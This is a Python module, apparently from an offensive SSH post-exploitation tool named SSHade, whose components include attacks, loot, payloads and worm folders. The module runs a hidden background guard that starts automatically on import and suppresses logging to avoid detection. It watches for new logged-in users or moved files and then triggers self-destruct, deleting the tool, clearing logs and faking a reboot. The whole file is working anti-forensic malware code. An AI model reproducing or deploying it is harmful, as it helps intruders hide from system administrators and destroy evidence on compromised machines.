#!/usr/bin/env python3
"""
Monitoring guard for SSHade post-exploitation tool.
Detects tampering and unauthorized access, triggers self-destruct.
"""

import os
import sys
import time
import threading
import subprocess
import logging
from pathlib import Path
from typing import Set, List, Optional
import signal

from .destruct import self_destruct

# Suppress logging to avoid detection
logging.getLogger().setLevel(logging.CRITICAL)

class SSHadeGuard:
    """Background monitoring guard for SSHade"""
    
    def __init__(self, sshade_root: str = None):
        """
        Initialize the guard
        
        Args:
            sshade_root: Root directory of SSHade installation
        """
        self.sshade_root = sshade_root or self._find_sshade_root()
        self.original_path = os.path.abspath(sys.argv[0])
        self.known_users = self._get_current_users()
        self.monitoring = False
        self.monitor_thread = None
        
        # SSHade files to monitor and destroy
        self.sshade_files = [
            "sshade.py",
            "core/",
            "attacks/",
            "data/",
            "keys/",
            "loot/",
            "payloads/",
            "post/",
            "utils/",
            "worm/",
            "config.yaml",
            "requierements.txt",
            "requierements.txt",
            "README.md"
        ]
        
    def _find_sshade_root(self) -> str:
        """Find the SSHade root directory"""
        current_dir = os.path.dirname(os.path.abspath(__file__))
        # Go up one level from core/ directory
        return os.path.dirname(current_dir)
    
    def _get_current_users(self) -> Set[str]:
        """Get list of currently logged in users"""
        try:
            result = subprocess.run(
                ["who"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                users = set()
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        user = line.split()[0]
                        users.add(user)
                return users
        except (subprocess.TimeoutExpired, FileNotFoundError, IndexError):
            pass
        return set()
    
    def _check_file_tampering(self) -> bool:
        """Check if SSHade files have been moved or renamed"""
        try:
            # Check if main script has been moved
            current_path = os.path.abspath(sys.argv[0])
            if current_path != self.original_path:
                return True
                
            # Check if SSHade root directory has changed
            current_root = os.path.dirname(current_path)
            if current_root != self.sshade_root:
                return True
                
            # Check if key files still exist
            key_files = ["sshade.py", "core/", "config.yaml"]
            for file in key_files:
                file_path = os.path.join(self.sshade_root, file)
                if not os.path.exists(file_path):
                    return True
                    
            return False
            
        except Exception:
            return True
    
    def _check_new_users(self) -> bool:
        """Check for new users logged in"""
        try:
            current_users = self._get_current_users()
            new_users = current_users - self.known_users
            
            if new_users:
                # Update known users but trigger alert
                self.known_users = current_users
                return True
                
            return False
            
        except Exception:
            return False
    
    def _get_sshade_file_paths(self) -> List[str]:
        """Get full paths of all SSHade files to destroy"""
        paths = []
        for file in self.sshade_files:
            file_path = os.path.join(self.sshade_root, file)
            if os.path.exists(file_path):
                paths.append(file_path)
        return paths
    
    def _trigger_self_destruct(self) -> None:
        """Trigger the self-destruct mechanism"""
        try:
            # Get all SSHade file paths
            files_to_destroy = self._get_sshade_file_paths()
            
            # Add current script and guard files
            current_script = os.path.abspath(sys.argv[0])
            guard_file = os.path.abspath(__file__)
            destruct_file = os.path.join(os.path.dirname(__file__), "destruct.py")
            
            files_to_destroy.extend([current_script, guard_file, destruct_file])
            
            # Remove duplicates
            files_to_destroy = list(set(files_to_destroy))
            
            # Trigger self-destruct
            self_destruct(
                files_to_remove=files_to_destroy,
                clear_logs=True,
                fake_reboot=True
            )
            
        except Exception:
            # If self-destruct fails, try to at least remove the main script
            try:
                current_script = os.path.abspath(sys.argv[0])
                if os.path.exists(current_script):
                    os.remove(current_script)
            except:
                pass
    
    def _monitor_loop(self) -> None:
        """Main monitoring loop"""
        while self.monitoring:
            try:
                # Check for file tampering
                if self._check_file_tampering():
                    self._trigger_self_destruct()
                    break
                
                # Check for new users
                if self._check_new_users():
                    self._trigger_self_destruct()
                    break
                
                # Sleep for 10 seconds
                time.sleep(10)
                
            except Exception:
                # If monitoring fails, trigger self-destruct
                self._trigger_self_destruct()
                break
    
    def start_monitoring(self) -> None:
        """Start the monitoring guard in background thread"""
        if self.monitoring:
            return
            
        self.monitoring = True
        self.monitor_thread = threading.Thread(
            target=self._monitor_loop,
            daemon=True,
            name="SSHadeGuard"
        )
        self.monitor_thread.start()
    
    def stop_monitoring(self) -> None:
        """Stop the monitoring guard"""
        self.monitoring = False
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)


def monitor(sshade_root: str = None) -> SSHadeGuard:
    """
    Start monitoring guard in background thread
    
    Args:
        sshade_root: Root directory of SSHade installation
        
    Returns:
        SSHadeGuard: The guard instance
    """
    guard = SSHadeGuard(sshade_root)
    guard.start_monitoring()
    return guard


def start_guard() -> None:
    """Convenience function to start the guard"""
    monitor()


# Auto-start guard when module is imported
if __name__ != "__main__":
    try:
        start_guard()
    except Exception:
        pass 